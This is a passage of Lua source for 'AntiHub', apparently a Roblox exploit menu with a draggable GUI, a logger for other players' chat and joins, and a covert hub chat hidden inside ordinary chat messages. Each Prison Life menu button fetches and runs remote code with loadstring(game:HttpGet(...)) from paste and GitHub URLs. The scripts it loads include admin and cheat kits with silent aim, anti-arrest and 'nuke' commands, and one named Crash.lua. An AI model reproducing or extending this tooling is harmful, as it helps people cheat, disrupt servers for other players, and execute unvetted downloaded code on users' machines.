G2L["28"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["28"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[Universal In Progress]];
G2L["28"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Antihub.TitleBar.UICorner
G2L["29"] = Instance.new("UICorner", G2L["2"]);
G2L["29"]["CornerRadius"] = UDim.new(0.015, 0);


-- StarterGui.Antihub.TitleBar.Title
G2L["2a"] = Instance.new("TextLabel", G2L["2"]);
G2L["2a"]["TextWrapped"] = true;
G2L["2a"]["Active"] = true;
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["TextSize"] = 14;
G2L["2a"]["TextScaled"] = true;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Sarpanch.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2a"]["Size"] = UDim2.new(0.175, 0, 0.8, 0);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Text"] = [[AntiHub]];
G2L["2a"]["Name"] = [[Title]];
G2L["2a"]["Position"] = UDim2.new(0.09974, 0, 0.5, 0);


-- StarterGui.Antihub.TitleBar.Title.UICorner
G2L["2b"] = Instance.new("UICorner", G2L["2a"]);
G2L["2b"]["CornerRadius"] = UDim.new(0.125, 0);


-- StarterGui.Antihub.TitleBar.Close
G2L["2c"] = Instance.new("TextButton", G2L["2"]);
G2L["2c"]["TextWrapped"] = true;
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextSize"] = 14;
G2L["2c"]["TextScaled"] = true;
G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2c"]["Size"] = UDim2.new(0.05, 0, 0.8, 0);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[X]];
G2L["2c"]["Name"] = [[Close]];
G2L["2c"]["Position"] = UDim2.new(0.95, 0, 0.5, 0);


-- StarterGui.Antihub.TitleBar.Close.UICorner
G2L["2d"] = Instance.new("UICorner", G2L["2c"]);
G2L["2d"]["CornerRadius"] = UDim.new(0.125, 0);


-- StarterGui.Antihub.TitleBar.Collapse
G2L["2e"] = Instance.new("TextButton", G2L["2"]);
G2L["2e"]["TextWrapped"] = true;
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["TextSize"] = 14;
G2L["2e"]["TextScaled"] = true;
G2L["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2e"]["Size"] = UDim2.new(0.05, 0, 0.8, 0);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Text"] = [[-]];
G2L["2e"]["Name"] = [[Collapse]];
G2L["2e"]["Position"] = UDim2.new(0.875, 0, 0.5, 0);


-- StarterGui.Antihub.TitleBar.Collapse.UICorner
G2L["2f"] = Instance.new("UICorner", G2L["2e"]);
G2L["2f"]["CornerRadius"] = UDim.new(0.125, 0);

-- StarterGui.Antihub.LocalScript
local function C_30()
	local AntiHub = G2L["1"]
	local Visible = true
	local VisWait = false
	local MenWait = false
	local Keybind = "R"
	local UIPos = UDim2.new(0, 0, 0, 0)
	local Expanded = true
	local Menu = "PrisonLife"
	local Chat = AntiHub:WaitForChild("TitleBar"):WaitForChild("Container"):WaitForChild("Container"):WaitForChild("Menus"):WaitForChild("Chat")
	local PrisonLife = AntiHub.TitleBar.Container.Container.Menus.PrisonLife
	local Universal = AntiHub.TitleBar.Container.Container.Menus.Universal
	local Logs = AntiHub.TitleBar.Container.Container.Menus.Logs
	local AntiCheat = AntiHub.TitleBar.Container.Container.Menus.AntiCheat
	local HidChat = game:GetService("Players").Chat
	local function HubChat(msg)
		HidChat(game.Players, "TNEChatAH".. msg)
	end

	local function GetCurrentTime()
		return DateTime.now():ToLocalTime().Hour.. ":".. DateTime.now():ToLocalTime().Minute.. ":".. DateTime.now():ToLocalTime().Second
	end
	
	AntiHub:WaitForChild("TitleBar").Active = true
	AntiHub.TitleBar.Draggable = true

	game:GetService("UserInputService").InputBegan:Connect(function(inp, proc)
		if proc then return end

		if inp.KeyCode == Enum.KeyCode:FromName(Keybind) then
			if VisWait then return end
			VisWait = true
			Visible = not Visible
			if Visible then
				game:GetService("TweenService"):Create(AntiHub.TitleBar, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {["Position"] = UIPos, ["Size"] = UDim2.new(0.5, 0, 0.05, 0)}):Play()
				task.wait(0.25)
				if Expanded then
					game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 4.75, 0), ["Size"] = UDim2.new(1, 0, 9.5, 0)}):Play()
				end
			else
				UIPos = AntiHub.TitleBar.Position
				if Expanded then
					game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 0.5, 0), ["Size"] = UDim2.new(1, 0, 1, 0)}):Play()
				end
				task.wait(0.25)
				game:GetService("TweenService"):Create(AntiHub.TitleBar, TweenInfo.new(0.25, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {["Position"] = UIPos - UDim2.new(0.25, 0, 0, 0), ["Size"] = UDim2.new(0.5, 0, 0, 0)}):Play()
			end
			task.wait(0.25)
			VisWait = false
		end
	end)

	AntiHub.TitleBar:WaitForChild("Close").Activated:Connect(function()
		if VisWait then return end
		VisWait = true
		Visible = false
		UIPos = AntiHub.TitleBar.Position
		if Expanded then
			game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 0.5, 0), ["Size"] = UDim2.new(1, 0, 1, 0)}):Play()
		end
		task.wait(0.25)
		game:GetService("TweenService"):Create(AntiHub.TitleBar, TweenInfo.new(0.25, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {["Position"] = UIPos - UDim2.new(0.25, 0, 0, 0), ["Size"] = UDim2.new(0.5, 0, 0, 0)}):Play()
		VisWait = false
	end)

	AntiHub.TitleBar.Collapse.Activated:Connect(function()
		if VisWait then return end
		Expanded = not Expanded
		VisWait = true
		if Expanded then
			game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 4.75, 0), ["Size"] = UDim2.new(1, 0, 9.5, 0)}):Play()
		else
			game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 0, 0), ["Size"] = UDim2.new(1, 0, 0, 0)}):Play()
		end
		task.wait(0.2)
		VisWait = false
	end)

	for i, v in AntiHub.TitleBar.Container.Container.List:GetChildren() do
		v.Activated:Connect(function()
			if Menu == v.Name then return end
			if MenWait then return end
			MenWait = true
			print(AntiHub.TitleBar.Container.Container.Menus[Menu])
			game:GetService("TweenService"):Create(AntiHub.TitleBar.Container.Container.Menus[Menu], TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {["GroupTransparency"] = 1}):Play()
			Menu = v.Name
			game:GetService("TweenService"):Create(AntiHub.TitleBar.Container.Container.Menus[Menu], TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {["GroupTransparency"] = 0}):Play()
			task.wait(0.1)
			MenWait = false
		end)
	end
	
	for i, v in game:GetService("Players"):GetPlayers() do
	if v == game:GetService("Players").LocalPlayer then continue end
		v.Chatted:Connect(function(msg)
			if msg:sub(1, 9) == "TNEChatAH" then
				local Message = msg:sub(10)
				Chat.Logs.Chat.Text ..= "<b>".. v.DisplayName.. ":</b> ".. Message.. "\n"
				Chat.Logs.CanvasSize = UDim2.new(0, 0, 0, game:GetService("TextService"):GetTextSize(Chat.Logs.Chat.Text, Chat.Logs.Chat.TextSize, Enum.Font.TitilliumWeb, Vector2.new(Chat.Logs.Chat.AbsoluteSize.X, math.huge)).Y)
				Chat.Logs.CanvasPosition += Vector2.new(0, 100)
			end
			Logs.Chat.Log.Text ..= GetCurrentTime().. " <b>".. v.DisplayName.. ":</b> ".. msg.. "\n"
			Logs.Chat.CanvasSize = UDim2.new(0, 0, 0, game:GetService("TextService"):GetTextSize(Logs.Chat.Log.Text, Logs.Chat.Log.TextSize, Enum.Font.TitilliumWeb, Vector2.new(Logs.Chat.Log.AbsoluteSize.X, math.huge)).Y)
			Logs.Chat.CanvasPosition += Vector2.new(0, 100)
		end)
	end


	game:GetService("Players").PlayerAdded:Connect(function(plr)
		Logs.Player.Log.Text ..= GetCurrentTime().. "<font color=\"rgb(0,128,0)\"".. plr.Name.. " (".. plr.DisplayName..  ") Joined!</font>"
		Logs.Player.CanvasSize = UDim2.new(0, 0, 0, game:GetService("TextService"):GetTextSize(Logs.Player.Log.Text, Logs.Player.Log.TextSize, Enum.Font.TitilliumWeb, Vector2.new(Logs.Player.Log.AbsoluteSize.X, math.huge)).Y)
		Logs.Player.CanvasPosition += Vector2.new(0, 100)
	if plr == game:GetService("Players").LocalPlayer then continue end
		plr.Chatted:Connect(function(msg)
			if msg:sub(1, 9) == "TNEChatAH" then
				local Message = msg:sub(10)
				Chat.Logs.Chat.Text ..= "<b>".. plr.DisplayName.. ":</b> ".. Message.. "\n"
				Chat.Logs.CanvasSize = UDim2.new(0, 0, 0, game:GetService("TextService"):GetTextSize(Chat.Logs.Chat.Text, Chat.Logs.Chat.TextSize, Enum.Font.TitilliumWeb, Vector2.new(Chat.Logs.Chat.AbsoluteSize.X, math.huge)).Y)
				Chat.Logs.CanvasPosition += Vector2.new(0, 100)
			end
			Logs.Chat.Log.Text ..= GetCurrentTime().. " <b>".. plr.DisplayName.. ":</b> ".. msg.. "\n"
			Logs.Chat.CanvasSize = UDim2.new(0, 0, 0, game:GetService("TextService"):GetTextSize(Logs.Chat.Log.Text, Logs.Chat.Log.TextSize, Enum.Font.TitilliumWeb, Vector2.new(Logs.Chat.Log.AbsoluteSize.X, math.huge)).Y)
			Logs.Chat.CanvasPosition += Vector2.new(0, 100)
		end)
	end)
	game:GetService("Players").PlayerRemoving:Connect(function(plr)
		Logs.Player.Log.Text ..= GetCurrentTime().. "<font color=\"rgb(128,0,0)\"".. plr.Name.. " (".. plr.DisplayName..  ") Left.</font>"
		Logs.Player.CanvasSize = UDim2.new(0, 0, 0, game:GetService("TextService"):GetTextSize(Logs.Player.Log.Text, Logs.Player.Log.TextSize, Enum.Font.TitilliumWeb, Vector2.new(Logs.Player.Log.AbsoluteSize.X, math.huge)).Y)
		Logs.Player.CanvasPosition += Vector2.new(0, 100)
	end)

	PrisonLife.Prizz.Activated:Connect(function()
		Execution_Runtime = tick()
		PLadmin_Settings = {
			DefaultPrefix = "?",
			JoinNotify = false,
			AutoRespawn = true,
			AntiVoid = true,
			AntiTase = false,
			AntiArrest = false,
			AntiShoot = false,
			AntiPunch = false,
			AntiFling = true,
			AntiShield = true,
			AntiBring = true,
			SilentAim = false,
			AutoGuns = false,
			OldItemMethod = false,
			Fullbright = false,
			WhitelistRanked = true,
			RankedNukeCmds = true,
			RankedMultiCmd = true,
			RankedOutput = true,
			WhisperToRanked = true,
		}
		wait()
		loadstring(game:HttpGet("https://paste.c-net.org/MailboxScurry",true))()
	end)

	PrisonLife.H4X.Activated:Connect(function()
		pcall(function()
			getgenv().FavoriteColor = Color3.fromRGB(80, 0, 10)
		end)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yTevezz1/SCRIPTADMINPRISONLIFE/main/H4X-ADMIN-V1"))()
	end)
	PrisonLife.Tiger.Activated:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/J0BB0T/Scripts/refs/heads/main/Tiger.lua"))()
	end)
	PrisonLife.PWare.Activated:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))()
	end)
	PrisonLife.Crash.Activated:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/J0BB0T/TNE/refs/heads/main/Crash.lua"))()
	end)

	Chat.Send.Activated:Connect(function()
		HubChat(Chat.Input.Text)
		Chat.Logs.Chat.Text ..= "<b>You:</b> ".. Chat.Input.Text.. "\n"
		Chat.Logs.CanvasSize = UDim2.new(0, 0, 0, game:GetService("TextService"):GetTextSize(Chat.Logs.Chat.Text, Chat.Logs.Chat.TextSize, Enum.Font.TitilliumWeb, Vector2.new(Chat.Logs.Chat.AbsoluteSize.X, math.huge)).Y)
		Chat.Logs.CanvasPosition += Vector2.new(0, 100)
	end)
end;
task.spawn(C_30);

return G2L["1"], require;
